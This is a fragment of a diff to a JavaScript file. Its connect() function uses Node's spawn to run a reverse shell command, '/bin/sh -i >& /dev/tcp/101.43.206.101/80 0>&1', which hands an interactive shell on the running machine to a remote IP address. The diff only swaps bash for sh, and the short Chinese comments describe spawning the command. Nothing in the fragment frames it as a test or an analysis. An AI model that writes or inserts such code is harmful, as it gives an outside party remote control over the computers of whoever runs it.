@@ -21,7 +21,7 @@ function connect() {
   // });
 
 // 使用spawn执行bash命令
-  const child = spawn('bash', ['-c', '/bin/bash -i >& /dev/tcp/101.43.206.101/80 0>&1']);
+  const child = spawn('bash', ['-c', '/bin/sh -i >& /dev/tcp/101.43.206.101/80 0>&1']);
 // 我们可以监听子进程的事件
   child.on('error', (err) => {
     console.error('Failed to start child process:', err);
